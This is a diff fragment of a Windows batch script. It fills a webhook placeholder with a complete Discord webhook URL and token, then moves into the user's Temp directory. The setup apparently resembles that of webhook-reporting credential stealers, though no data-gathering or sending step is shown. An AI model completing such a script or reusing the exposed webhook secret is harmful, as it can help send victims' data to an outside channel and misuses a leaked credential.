@@ -1,5 +1,5 @@
 @echo off
-set webhook=[ADD HOOK HERE]
+set webhook=[https://discord.com/api/webhooks/1483919065990037624/u2cWhomIpKa9p8Kj0X00cfh_EcrPQ8-K82U5lUmXlUcPSeFH_PkTxgCG7ph7rXZUySj6]
 cd /d %userprofile%\AppData\Local\Temp
 set TempHome=%cd%
 
